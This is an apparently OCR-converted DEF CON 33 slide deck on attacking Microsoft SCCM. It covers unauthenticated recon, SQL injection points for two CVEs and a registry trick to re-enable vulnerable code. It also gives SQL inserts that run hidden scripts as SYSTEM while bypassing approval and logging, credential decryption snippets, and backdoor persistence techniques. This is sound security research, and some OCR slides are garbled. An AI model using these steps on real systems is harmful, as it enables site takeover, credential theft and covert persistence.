---
title: "SCCM The tree that always bears bad fruits"
speakers: ["Mehdi Elyassa"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33/Mehdi Elyassa - SCCM The tree that always bears bad fruits.pdf"
pages: 54
sha256: "05674b977a31c7f9acb11b628cc0778e24fdd0f1b5d09d0d5e938d0547c31484"
text_chars: 25883
ocr_pages: 3
has_ocr: true
redacted_secrets: 0
ocr_confidence: 80.3
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T07:06:59Z"
---
# SCCM The tree that always bears bad fruits

**Speakers:** Mehdi Elyassa  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33/Mehdi Elyassa - SCCM The tree that always bears bad fruits.pdf` (54 pages)


## Slide 1

**SCCM: The tree that always bears bad fruits Mehdi Elyassa - DEF CON 33 - August 10, 2025**

DEF CON 33

## Slide 2

# **<u>whoami</u>**

#### **Mehdi Elyassa**

   - Red Teamer at Synacktiv, an offensive security company

-

   - Over 8 years in IT security

-

- Vulnerability researcher with a strong interest in web technologies

@kalimer0x00

**2**

DEF CON 33

## Slide 3

# **<u>Agenda</u>**

- **SCCM Internals**

- **Finding 0days**

- **Post-exploitation**

- **Persistence**

**3**

DEF CON 33

## Slide 4

# **SCCM Internals**

**4**

DEF CON 33

## Slide 5

# **<u>SCCM Internals</u>**

Introduction

- a.k.a Configuration Manager

- SCCM is a systems and endpoint management solution

- Deploys an agent on managed devices that provides code execution capabilities, making it Microsoft's native C2

- Now part of the Intune product family

**5**

DEF CON 33

## Slide 6

# **<u>SCCM Internals</u>**

#### Client communications

■ **Client to Management Point**

■ **EHTTP** : (default) Enhanced HTTP

■ **HTTPS** : mutual TLS with an internal PKI (e.g. ADCS)

**6**

DEF CON 33

## Slide 7

# **<u>SCCM Internals</u>**

- Several web applications hosted on IIS

- Mix of modern and legacy technologies

■ ISAPI modules

■ .NET Framework apps

- COM used extensively for internal communication

   - Long chains of sequential COM calls across components

**7**

DEF CON 33

## Slide 8

# **<u>SCCM Internals</u>**

#### SMS Management Point

- ISAPI modules

      - **/.sms_pol** — Policy download

   -

   - **/.sms_dcm** — Scripts download

-

- **/.sms_aut** — Location services information

> ■ **Legacy code** — query parameters are parsed manually...

- **Multiple entrypoints**

   - `/SMS_MP`

   - `/SMS_MP_WindowsAuth`

   - `/SMS_MP_AltAuth`

   - `/SMS_MP_TokenAuth`

- **Anonymous authentication** enabled on most endpoints

- `PS Z:\> .\dump_iis_appconf.ps1 [...] - app:` **`/SMS_MP (SMS Management Point Pool) anon: True`** `handlers: - module=IsapiModule ; path=` **`.sms_dcm`** `; handler=c:\program files\sms_ccm\getsdmpackage.dll - module=IsapiModule ; path=` **`.sms_aut`** `; handler=c:\program files\sms_ccm\getauth.dll - module=IsapiModule ; path=` **`.sms_pol`** `; handler=c:\program files\sms_ccm\getpolicy.dll`

- `- app:` **`/SMS_MP_WindowsAuth (SMS Windows Auth Management Point Pool)`** `anon: False handlers: - module=IsapiModule ; path=.sms_pol ; handler=c:\program files\sms_ccm\getpolicy.dll`

- `- app:` **`/SMS_MP_AltAuth (SMS Management Point Pool)`** `anon:` **`True`** `handlers: - module=IsapiModule ; path=.sms_dcm ; handler=c:\program files\sms_ccm\getsdmpackage.dll - module=IsapiModule ; path=.sms_aut ; handler=c:\program files\sms_ccm\getauth.dll - module=IsapiModule ; path=.sms_pol ; handler=c:\program files\sms_ccm\getpolicy.dll`

- `- app:` **`/SMS_MP_TokenAuth (SMS Management Point Pool)`** `anon:` **`True`** `handlers: - module=IsapiModule ; path=.sms_dcm ; handler=c:\program files\sms_ccm\getsdmpackage.dll - module=IsapiModule ; path=.sms_aut ; handler=c:\program files\sms_ccm\getauth.dll - module=IsapiModule ; path=.sms_pol ; handler=c:\program files\sms_ccm\getpolicy.dll`

**8**

DEF CON 33

## Slide 9

# **<u>SCCM Internals</u>**

SMS Management Point

### **Mutual TLS, They Said…**

- If HTTPS mode is enabled, use:

   -

      - `/SMS_MP_TokenAuth/`

   - `/SMS_MP_AltAuth/` (>= v2403)

- **`$ curl -i '`** **`https:`** **`//cmc.corp.local`** **`/sms_mp`** **`/.sms_aut?SMSTRC'`** `HTTP/1.1` **`403 Client certificate required`**

- **`$ curl -i 'https://cmc.corp.local`** **`/sms_mp_altauth/`** **`.sms_aut?SMSTRC'`** `HTTP/2` **`200`**

**9**

DEF CON 33

## Slide 10

# **<u>SCCM Internals</u>**

SMS Management Point

##### **Unauth recon: Enumerate Management Points**

> ■ **MPLIST** method on the **getauth** module returns all MPs for current site

   - `/sms_mp/.sms_aut?MPLIST`

- Interesting fields

   - `Version` build number

- `$ curl 'http://cmc.corp.local/sms_mp/` **`.sms_aut?MPLIST`** `'` `<MPList>`

- `<MP Name="CMC.CORP.LOCAL" FQDN="CMC.corp.local">` **`<Version>9128</Version>`**

- `<Capabilities SchemaVersion="1.0">`

- `<Property Name="` **`SSLState`** `"` `Value="` **`0`** `"/> </Capabilities>`

\```
    </MP>
\```

\```
</MPList>
\```

   - `SSLState` indicates if HTTPS mode is enabled

- **MPLIST1** method returns MPs from other sites in the hierarchy

- `$ curl 'http://cmc.corp.local/sms_mp/` **`.sms_aut?MPLIST1&XYZ`** `'` `<MPList>`

- `<MP Name="CMC.XYZ.LOCAL" FQDN="CMC.xyz.local" SiteCode="XYZ"> <Version>9128</Version>`

- `<Capabilities SchemaVersion="1.0">`

- `<Property Name="SSLState" Value="0"/>`

- `</Capabilities> </MP>`

\```
</MPList>
\```

**10**

DEF CON 33

## Slide 11

# **<u>SCCM Internals</u>**

#### CcmMessaging

###### **CcmMessaging**

- Single ISAPI module

- **Multiple entrypoints**

   - `/CCM_System`

   - `/CCM_System_WindowsAuth`

   - `/CCM_System_AltAuth`

   - `/CCM_System_TokenAuth`

■ **Anonymous authentication** enabled on most endpoints

- `app:` **`/CCM_System (CCM Server Framework Pool)`** `anon:` **`True`** `handlers:`

- `module=IsapiModule ; path=` **`*`** `; handler=c:\program files\sms_ccm` `\` **`ccmisapi.dll`**

- `- app:` **`/CCM_System_WindowsAuth (CCM Windows Auth Server Framework Pool)`** `anon: False handlers:`

- `module=IsapiModule ; path=* ; handler=c:\program files\sms_ccm\ccmisapi.dll`

- `- app:` **`/CCM_System_AltAuth (CCM Server Framework Pool)`** `anon:` **`True`** `handlers:`

- `module=IsapiModule ; path=* ; handler=c:\program files\sms_ccm\ccmisapi.dll`

- `- app:` **`/CCM_System_TokenAuth (CCM Server Framework Pool)`** `anon:` **`True`** `handlers:`

- `module=IsapiModule ; path=* ; handler=c:\program files\sms_ccm\ccmisapi.dll`

**11**

DEF CON 33

## Slide 12

# **<u>SCCM Internals</u>**

CcmMessaging

■ HTTP-based communication protocol

- `CCM_POST` method and a single path `/request`

■

- A message signature may be included in the header as a device identity proof

\```
CCM_POST /ccm_system/request HTTP/1.1
Host: cmc.corp.local
--aAbBcCdDv1234567890VxXyYzZ
content-type: text/plain; charset=UTF-16
\```

\```
<@utf16-encode><MsgSchemaVersion="1.1">[XML]</Msg><@/utf16-encode>    <-- HEADER PART
--aAbBcCdDv1234567890VxXyYzZ
ncontent-type: application/octet-stream
\```

- `<@zlib-compress><@utf16-encode>[XML]<@/utf16-encode><@/zlib-compress>` **`<-- REQUEST PART`** `--aAbBcCdDv1234567890VxXyYzZ--`

**12**

DEF CON 33

## Slide 13

# **<u>SCCM Internals</u>**

#### CcmMessaging

- ISAPI module distributes the message to the right service handler via COM

   - Matches the name set in the `TargetEndpoint` field in the CcmMessage header part

- WMI object **CCM_Service_EndpointConfiguration**

   - In 2 namespaces

      - `root\ccm\Policy\DefaultMachine\RequestedConfig` ( **persistant** )

      - `root\ccm\Policy\Machine\ActualConfig`

   - The **Visibility** field indicates if an identity proof is required

\```
PS> Get-WmiObject-Namespace'root/ccm/policy/machine/actualconfig'-Query'select * from CCM_Service_EndpointConfiguration'
    | Sort-Object Visibility | select Name, Visibility, DisplayName, CoClass
\```

\```
Name                           Visibility   DisplayName                                    CoClass

MP_LocationManagerAll          LocationManagerHandler Class{F21CCBF9-50A5-45E0-9B65-...
MP_ClientRegistration          All          RegMessageHandler Class                        {C15098C5-57E0-4859-B1C6-...
MP_PolicyManager               ClientSigned PolicyManagerHandler Class                     {F0570116-3E80-48FB-8AF7-...
MP_TokenManager                ClientSigned TokenManagerHandler Class                      {6FC37979-BF68-4B43-878F-...
EndpointProtectionAgent        Internal     SMS EP agent                                   {2B0704D2-E90B-4491-9595-...
CoManagementEndpoint           Internal     CoManagement Endpoint                          {12FDFF24-8D82-41DB-A8B4-...
ClientRegistration             Signed       CCM Registration Endpoint                      {8EC7E83E-3F67-414B-A9EC-...
LS_ReplyLocations              Signed       CCL Location Services Reply Locations Endpoint {2F382DC1-FF25-486E-896F-...
[...]
\```

**13**

DEF CON 33

## Slide 14

# **<u>SCCM Internals</u>**

CcmMessaging

### **Mutual TLS, They (Still) Said…**

- If HTTPS mode is enabled, use:

   - `/CCM_System_AltAuth/` (>= v2403)

   -

   - ~~`/CCM_System_TokenAuth/`~~ (not working 🙁 )

- **`$ curl -i 'https://cmc.corp.local`** **`/ccm_system`** **`/request' -X CCM_POST`** `HTTP/1.1` **`403 Client certificate required`**

- **`$ curl -ki 'https://cmc.corp.local`** **`/ccm_system_altauth/`** **`request' -X CCM_POST`** `HTTP/2` **`200`**

**14**

DEF CON 33

## Slide 15

# **<u>SCCM Internals</u>**

CcmMessaging

### **Mutual TLS, They (Still) Said…**

- How to loot NAA credentials without credentials?

   - Use `/CCM_System_AltAuth/request` to register clients

      - With this trick, devices are approved without supplying a machine's Windows credentials

   - Then, hit `/SMS_MP_AltAuth/.sms_pol` to pull policies

This trick will be included in github.com/synacktiv/SCCMSecrets

**15**

DEF CON 33

## Slide 16

# **<u>SCCM Internals</u>**

### **SMS Provider**

- Installed by default on the primary site server

- Abstraction layer for read/write operations on the database via WMI calls

   - WMI Namespace **SMS\SMS_<SITE_CODE>**

      - Role-based access control (defined and mapped in DB)

   -

- Local group **SMS Admins** grants access permission, auto assign:

   - Any user or group assigned an RBAC role (based on database updates)

   - Machine accounts of Management Point servers (relay 😉 )

**16**

DEF CON 33

## Slide 17

# **<u>SCCM Internals</u>**

SMS Provider

### **AdminService REST API**

- Standalone .NET app built with OWIN

   - `adminservice.host.dll`

   - Microsoft.ConfigurationManager.AdminService in

   - No way to configure **EPA** (relay 😉 )

- `/{AdminService,AdminService_TokenAuth}/{wmi,v1.0}/` (JSON)

   - OData: `/AdminService/v1.0/Device?$filter=Name+eq+'<SEARCH>'`

   - WMI Objects: `/AdminService/wmi/SMS_AdminRole`

**17**

DEF CON 33

## Slide 18

# **<u>SCCM Internals</u>**

Tenant attach

- Connect an SCCM environment to Intune

   -

Syncs device and user information from SCCM to Intune

-

      - Take actions from the Intune console (restart, queries, run scripts, install apps, etc.)

- Creates an Entra application named **ConfigMgrSvc_<GUID>**

   - Permissions on the tenant

      - **CmCollectionData.Read** + **CmCollectionData.Write** (Configuration Manager Microservice)

         - **Directory.Read.All** (Graph API)

**18**

DEF CON 33

## Slide 19

# **Finding 0days**

**19**

DEF CON 33

## Slide 20

# **<u>Finding 0days</u>**

### **CVE-2024-43468: Unauthenticated SQL injection**

■ Affects the **MP_LocationManager** handler of **CcmMessaging** service

   - `Visibility = All` → no device identity proof needed

- MP has **sysadmin** role → instant site takeover

   - Microsoft advises installing site server roles on distinct machines

https://github.com/synacktiv/CVE-2024-43468

https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43468

**20**

DEF CON 33

## Slide 21

**<u>Finding 0days</u>** CVE-2024-43468: Unauthenticated SQL injection

   - ~~Advanced reverse engineering techniques~~

-

- Started the research by analyzing strings

   - **`$ strings -e l v2403/SMS_CCM/LocationMgr.dll | grep 'EXEC '`** `EXEC MP_GetDistributeOnDemandDPs @ServerNames = N'%ws' EXEC MP_IsPartialDownloadEnabled` **`EXEC MP_GetMachineID @Identifier = N'%ws'`**

\```
EXEC MP_GetContentID @UniqueID = N'%ws', @ContentVersion = %d
\```

**21**

DEF CON 33

## Slide 22

**<u>Finding 0days</u>** CVE-2024-43468: Unauthenticated SQL injection

**22**

DEF CON 33


> Recovered by OCR — confidence 75/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Finding Odays & OYNACKTIV
CVE-2024-43468: Unauthenticated SQL injection
2 __intéd al,
4 LONG *a3)
6| // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]
7
8) vw3l = a2;
12) v8 = CCM: :Utility: :ComString: :opearator unsigned short const * (az);
13) v9 = CCM: :Utility: :String: : format ((CCM::Utility::String *)v33, L"EXEC MP_GatMachineID @Identifier = N'tws'", v8);
14) CCM: :Utility: :String: :oparator=(v33, v9);
15| vl = *(_QWORD *) (al + 448);
16) vill = (const unsigned __intl6 *)CCM: :Utility::String::oparator unsigned short const *(v33);
18| vl3 = (*(__inté4 (__fastecall **){__inté4, _QWORD, _QWORD)) (*(_QWORD *)v10 + 32164))(v10, *(_QWORD *) (vl2 + 8), 0164);
20) if (vii)
2i| {
DEF CON 33 22
```

## Slide 23

**<u>Finding 0days</u>** CVE-2024-43468: Unauthenticated SQL injection

**23**

DEF CON 33


> Recovered by OCR — confidence 74/100 on the text kept, 54/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Finding Odays
CVE-2024-43468: Unauthenticated SQL injection
J
¥
:: Location: : CHandleLocat ionRequest : :AddDPSiteList ToReply|
SYNACKTIV
J
¥
cation: :CHandleLocat ionRequest : : AddDPSiteToReply| CM: :MP: : Location: : CHandleLocat ionRequest : :AddDPSiteToRep]
CHandleLocat ionRequest_QueryDBForCont ent SuperPeerInfoUnprotected,
J
Qu
DEF CON 33
23
```

## Slide 24

**<u>Finding 0days</u>** CVE-2024-43468: Unauthenticated SQL injection

■ **getMachineID()** is called right before **UpdateSF()**

**24**

DEF CON 33

## Slide 25

# **<u>Finding 0days</u>**

CVE-2024-43468: Unauthenticated SQL injection

■ Which request to pick? — **UpdateSFRequest**

\```
__int64 __fastcall CCM::MP::Location::CHandleLocationRequest::ParseRequestBody(__int64 a1, __int64 a2)
{
[...]
\```

\```
if ( (unsigned __int8)sub_180049118(v175, L"EnumerateMPLocationRequest") )[...]
if ( (unsigned __int8)sub_180049118(v203, L"SiteInformationRequest") )[...]
if ( (unsigned __int8)sub_180049118(v214, L"AssignedSiteRequest") )[...]
if ( (unsigned __int8)sub_180049118(v218, L"UpdateSFRequest") )[...]
if ( (unsigned __int8)sub_180049118(v247, L"TokenServicesRequest") )[...]
\```

**25**

DEF CON 33

## Slide 26

# **<u>Finding 0days</u>**

CVE-2024-43468: Unauthenticated SQL injection

■ Injection point in the **SourceID** field in the header

- `<Msg ReplyCompression="zlib" SchemaVersion="1.1">`

- `<Body Type="ByteRange" Length="556" Offset="0" />`

- `<CorrelationID>{00000000-0000-0000-0000-000000000000}</CorrelationID>`

- `<Hooks>`

- `<Hook3 Name="zlib-compress" />`

- `</Hooks>`

- `<ID>{00000000-0000-0000-0000-000000000000}</ID>`

- `<Payload Type="inline"/>`

- `<Priority>0</Priority>`

- `<Protocol>http</Protocol>`

- `<ReplyMode>Sync</ReplyMode>`

- `<ReplyTo>direct:dummyEndpoint:LS_ReplyLocations</ReplyTo>`

- `<TargetAddress>mp:[http]MP_LocationManager</TargetAddress>`

- **`<TargetEndpoint>MP_LocationManager</TargetEndpoint>`**

- `<TargetHost>https://cmc.corp.local</TargetHost>`

- `<Timeout>60000</Timeout>`

- **`<SourceID>GUID:[GUID]'; [SQL_QUERY] ; --  </SourceID>`**

###### `<` **`UpdateSFRequest`** `>`

   - `<Package ID="UID:00000000-0000-0000-0000-000000000000" Version="1">`

   - `</Package>`

   - `<ClientLocationInfo>`

   - `<BoundaryGroups>`

   - `<BoundaryGroup GroupID="1" GroupGUID="00000000-0000-0000-0000-000000000000" GroupFlag="0"/>`

   - `</BoundaryGroups>`

   - `</ClientLocationInfo>`

   - `</UpdateSFRequest>`

- `</Msg>`

###### **Header**

**Body**

**26**

DEF CON 33

## Slide 27

# **<u>Finding 0days</u>**

CVE-2024-43468: Unauthenticated SQL injection

■ **Patch analysis**

- Usage of prepared statements

■

But, the vulnerable code remains, wrapped in an if-condition 🤔

**27**

DEF CON 33

## Slide 28

# **<u>Finding 0days</u>**

CVE-2024-43468: Unauthenticated SQL injection

- Set registry value `DisableAdditionalValidations` under `HKLM\SOFTWARE\Microsoft\SMS\MP` to **fallback to vulnerable code**

**28**

DEF CON 33

## Slide 29

# **<u>Finding 0days</u>**

### **CVE-2025-47178: Authenticated SQL injection**

- Impacts the SMS Provider

   - **sysadmin** role → instant site takeover

- Any RBAC role, even read-only, can be leveraged

- Patch released in July 2025

https://github.com/synacktiv/CVE-2025-47178

https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47178

**29**

DEF CON 33

## Slide 30

# **<u>Finding 0days</u>**

CVE-2025-47178: Authenticated SQL injection

■ Reviewed WMI MOF for string inputs on numeric params

■ `SMS_DeploymentSummary.UpdateClassicDeployment()`

\```
#File: smsprov.mof
\```

\```
class SMS_DeploymentSummary: SMS_BaseClass
{
[...]
\```

\```
    [Description("Updates summarized results for a particular deployment."), static, implemented]
    sint32      UpdateDeployment([in] uint32 AssignmentID);
\```

\```
    [Description("Updates summarized results for a particular Classic Deployment."), static, implemented]
    sint32      UpdateClassicDeployment([in] string OfferID);
};
\```

**30**

DEF CON 33

## Slide 31

# **<u>Finding 0days</u>**

CVE-2025-47178: Authenticated SQL injection

■ Injection occurs during permission validation 😅

**31**

DEF CON 33

## Slide 32

**<u>Finding 0days</u>** CVE-2025-47178: Authenticated SQL injection

- How to exploit?

   -

   - Find credentials of a user with an SCCM role

- Or, relay authentication to `/AdminService` (HTTPS), based on site role topology:

      - **MP without SMS Provider** : relay MP → SMS Provider server

      - **Multiple MPs in the site** : relay MP → another MP that has the SMS Provider role

      - **MP with SMS Provider installed** : perform self-relay (CVE-2025-33073)

**32**

DEF CON 33

## Slide 33

# **<u>Finding 0days</u>**

### **CVE-2025-?????**

More to come, stay tuned

**33**

DEF CON 33

## Slide 34

# **Post-exploitation**

**34**

DEF CON 33

## Slide 35

# **<u>Post-exploitation</u>**

Run Scripts

- **Create and run scripts** feature allows command execution on clients

   -

      - Execution as SYSTEM

   - Process spawned by a trusted binary `C:\Windows\CCM\CcmExec.exe`

- Existing public tools leverage the **AdminService** API to call this feature

   -

   - All actions are logged 👎

- Requires two SCCM administrative accounts 👎

      - By default, new scripts must be approved by someone other than their creator

      - ■ Double approval can be disabled at the database level

\```
SQL>INSERT INTO CM_<CODE>..SC_SiteDefinition_Property (Name,Value3) Values ('TwoKeyApproval', '0')
\```

**35**

DEF CON 33

## Slide 36

# **<u>Post-exploitation</u>**

Run Scripts

- Can the script execution feature be triggered directly at the database level?

   - Circumvents the double approval process

   - Produces minimal logging traces

**36**

DEF CON 33

## Slide 37

# **<u>Post-exploitation</u>**

Run Scripts

1. Create an entry in the `Scripts` table

   - `Script` hex value encoded in UTF-16 with BOM marker

   -

   - `ScriptHash` SHA256 hash

- `ScriptType` set to 0 for PowerShell

- `ApprovalState` set to 3 to mark script as approved

- `Feature` set to 1 to hide the script from the admin console

- `Approver` / `Author` free text :)

\```
INSERT INTO CM_ABC..SCRIPTS
\```

\```
 (ScriptGuid, ScriptVersion, ScriptName, Script, ScriptType, Approver, ApprovalState, Feature, Author, LastUpdateTime, ScriptHash, Comment) VALUES
 ('[GUID]', 1, '[NAME]', 0x[UTF16_HEX], 0 , 'USER2', 3, 1, 'USER1', '', '[HASH]', '')
\```

**37**

DEF CON 33

## Slide 38

# **<u>Post-exploitation</u>**

#### Run Scripts

2. Add an entry into the `BGB_Task` table referencing the script GUID

   - `TemplateID` set to 15 for **Request Script Execution**

   - `Param` is the **TaskParam** XML document

\```
INSERT INTO CM_ABC..BGB_Task
 (TemplateID, CreateTime, Signature, GUID, Param) VALUES
 (15, '', NULL, '[GUID]', '[TASK_PARAM_BASE64]')
\```

- `<ScriptContent ScriptGuid='[SCRIPT_GUID]'>`

- `<ScriptVersion>[SCRIPT_VERSION]</ScriptVersion>`

- `<ScriptType>0</ScriptType>`

- `<ScriptHash ScriptHashAlg='SHA256'>[HASH]</ScriptHash>`

- `<ScriptParameters></ScriptParameters>`

- `<ParameterGroupHash ParameterHashAlg='SHA256'></ParameterGroupHash> </ScriptContent>`

##### **TaskParam XML Document**

**38**

DEF CON 33

## Slide 39

# **<u>Post-exploitation</u>**

Run Scripts

3. Add an entry to the `BGB_ResTask` table: assigns the task to a client

\```
INSERT INTO CM_ABC..BGB_ResTask
  (ResourceID, TemplateID, TaskID, Param) VALUES
  ([RESSOURCEID], 15, [TASKID], '')
\```

This insertion triggers a **push notification** to the client

4. Check script execution output in table `ScriptsExecutionStatus` (slight delay)

\```
SELECT ResourceID, ScriptOutput FROM CM_ABC..ScriptsExecutionStatus
WHERE TaskID ='{<BGB_TASK_GUID>}'
\```

**39**

DEF CON 33

## Slide 40

# **<u>Post-exploitation</u>**

Run Scripts

■ **What about logging?**

- The `TaskParam` received by the client is logged in

###### `C:\Windows\CCM\Logs\CcmNotificationAgent.log`

- Script content isn't logged

\```
<![LOG[Receive task from server with pushid=12, taskid=16,
taskguid=BBCD3B72-0D42-456A-AC4C-3728F45B7B60, tasktype=15 and
taskParam=PFNjcmlwdENvbnRlbnQgU2NyaXB0R3VpZD0nMDlkYzU5NjAtMmM0Ni...250ZW50Pg==]LOG]!>
<time="22:42:29.600-60" date="10-07-2024" component="BgbAgent" context="" type="1"
thread="3008" file="bgbconnector.cpp:386">
\```

**40**

DEF CON 33

## Slide 41

# **<u>Post-exploitation</u>**

Run Scripts

Executed scripts remain in the client's ScriptStore folder.

**41**

DEF CON 33


> Recovered by OCR — confidence 92/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Post-exploitation
Run Scripts
Directory: C:\Windows\COM\ScriptStore
Mode LastWriteTime Length Name
Executed scripts remain in the client's ScriptStore folder.
DEF CON 33
41
```

## Slide 42

**<u>Post-exploitation</u>** sccmsqlclient.py

- `sccmsqlclient.py` an MSSQL client with pre-built queries for SCCM

   - Based on impacket's mssqlclient

   -

   - Recon

      - Topology mapping

      - Stored credentials

-

   - Run PowerShell scripts on clients

- Automate secrets decryption

■ Available here: github.com/synacktiv/sccmsqlclient

**42**

DEF CON 33

## Slide 43

# **<u>Post-exploitation</u>**

sccmsqlclient.py

### **Recon**

- `sccm_servers` : List servers in the hierarchy, along with the associated database

- server and site code

- `sccm_devices` : List known devices, with partial filtering by name or IP address

- `sccm_devices_bgbstatus` : List clients with their BGB / Notification channel status

   - ( _OnlineStatus=0|1_ )

**43**

DEF CON 33

## Slide 44

**<u>Post-exploitation</u>** sccmsqlclient.py

## **Run Scripts**

- `set_ps1_script <string>` / `load_ps1_script <path>`

- `sccm_run_script <RESSOURCE_ID>`

- `last_task_output` / `last_task_output_print`

- ■ `last_task_clean`

The tool prepends a command to clean the ScriptStore folder

**44**

DEF CON 33

## Slide 45

# **<u>Post-exploitation</u>**

sccmsqlclient.py

#### **Extract secrets**

- `sccm_useraccounts` : Query the `SC_UserAccount` table that stores credentials for NAA,

Push or Proxy accounts

- **Password** encrypted with CryptoAPI and stored in an SCCM structure

- Only the site system server that created the blob can decrypt it (useSiteSystemKey=false)

\```
SQL> sccm_useraccounts
ID   SiteCode   SiteServerName    UserName       Password
--   --------   --------------   ---------    -----------
5        ABC   cmc.corp.local    CORP\naa    0C0100000..
6        ABC   cmc.corp.local   CORP\push    0C0100000..
\```

**45**

DEF CON 33

## Slide 46

# **<u>Post-exploitation</u>**

sccmsqlclient.py

### **Extract secrets**

- `sccm_aad_apps` : Query the `AAD_Application_Ex` table that stores Entra ID

- credentials (Tenant Attach)

   - **SecretKey** encrypted with CryptoAPI (useSiteSystemKey=false)

   - ■ **SecretKeyForSCP** encrypted with a **site system key** (useSiteSystemKey=true)

\```
SQL> sccm_aad_apps
      ID   ClientID                               Name                  SecretKey   SecretKeyForSCP
--------   ------------------------------------   -------------------   ----------  ---------------
1677721712345678-1234-1234-1234-1234567890ab   ConfigMgrSvc_<GUID>0C010000..   308201A80609..
\```

**46**

DEF CON 33

## Slide 47

# **<u>Post-exploitation</u>**

sccmsqlclient.py

###### **Extract secrets**

- `sccm_decrypt_blob [ResourceID] [BLOB]` Run PowerShell snippets on the site system server to decrypt the

- secrets

■ Secret is replicated between site system servers (useSiteSystemKey=true)

\```
Add-Type-Path"C:\Program Files\Microsoft Configuration Manager\bin\X64\microsoft.configurationmanager.azureaddiscovery.dll"
\```

\```
$ss = [Microsoft.ConfigurationManager.AzureADDiscovery.Utilities]::GetDecryptedAppSecretKey("[SecretKeyForSCP]")
[Microsoft.ConfigurationManager.AzureADDiscovery.Utilities]::ConvertToPlainString($ss)
\```

■

Secret is unique per site system server (useSiteSystemKey=false)

\```
Add-Type-Path"C:\Program Files\Microsoft Configuration Manager\bin\X64\microsoft.configurationmanager.cloudservicesmanager.dll"
\```

- `[Microsoft.ConfigurationManager.CloudServicesManager.Utility]::GetCertificateContent("[SecretKey|Password]", [ref]$null)`

**47**

DEF CON 33

## Slide 48

# **<u>Post-exploitation</u>**

sccmsqlclient.py

### **DEMO**

**48**

DEF CON 33

## Slide 49

# **Persistence**

**49**

DEF CON 33

## Slide 50

# **<u>Persistence</u>**

### **Backdoor CcmMessaging with a rogue handler**

- Create a DLL that implements the `ICcmEndpoint::Execute` COM method

   - Receives PowerShell commands

   - Returns command output

- Register its CLSID on the Management Point

- Create a new `CCM_Service_EndpointConfiguration` WMI object that uses the rogue CLSID

- POC available here: github.com/synacktiv/CcmMessagingBackdoor

**50**

DEF CON 33

## Slide 51

# **<u>Persistence</u>**

■ **ICcmEndpoint::Execute** has to be implemented to process incoming messages

\```
classCcmEndpoint::Execute(*CcmMessaging, *CcmMessage, *CcmEndpointContext, *IUnknown)
\```

- The incoming message is provided as the second argument, read its body with:

   - **ICcmMessage.GetBodyWString()**

- Use the first argument to send the reply

   -

- **ICcmMessaging.SendMessage(responseMsg, ...)**

**51**

DEF CON 33

## Slide 52

# **<u>Persistence</u>**

### **DEMO**

**52**

DEF CON 33

## Slide 53

# **<u>Persistence</u>**

### **Backdoor stored procedures**

- Alter a procedure used by an unauthenticated endpoint/service to execute arbitrary SQL statements

- Some examples

   - `/sms_mp/.sms_pol` calls `MP_GetPolicyBody`

   -

      - `/sms_mp/.sms_dcm` calls `MP_GetSdmDocument`

   - `SiteInformationRequest` in `MP_Location` service handler calls `MP_GetSiteInfo`

- `<SiteInformationRequest><SiteCode Name="{INPUT}" /></SiteInformationRequest>`

**53**

DEF CON 33

## Slide 54

# **Thank you!**

■ Code can be found at:

■ github.com/synacktiv/CVE-2025-47178 ■ github.com/synacktiv/sccmsqlclient

■ github.com/synacktiv/CcmMessagingBackdoor

- Stay tuned to our blog, upcoming posts and advisories on this topic

**54**

DEF CON 33
